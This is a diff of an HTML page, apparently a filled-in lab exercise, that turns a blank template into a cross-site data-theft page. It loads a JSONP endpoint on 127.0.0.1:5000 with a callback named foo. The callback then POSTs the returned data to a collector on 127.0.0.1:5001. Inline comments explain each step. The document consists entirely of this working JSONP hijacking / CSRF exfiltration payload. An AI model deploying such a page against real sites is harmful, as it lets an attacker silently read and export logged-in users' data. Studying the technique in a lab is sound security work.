@@ -30,10 +30,17 @@
     <body>
         <p>Feed me your data!</p>
         <script type="application/javascript">
-            function foo(e) {
-                
-            }                
+            function foo(data) {
+                fetch("http://127.0.0.1:5001/content", { // post data to http://127.0.0.1:5001/content
+                    "method": "POST", // set method to post
+                    headers: {
+                        "Content-Type": "application/json", // set content type to json
+                    },
+                    "body":  data // put data (from the parameter of callback) to the request body
+                })
+            }  
         </script>
-        <script type="application/javascript" src="your CSRF URI goes here"></script>
+        <!-- send request, the callback function will be invoked with actual data as parameter -->
+        <script type="application/javascript" src="http://127.0.0.1:5000/?callback=foo"></script>
     </body>
 </html>
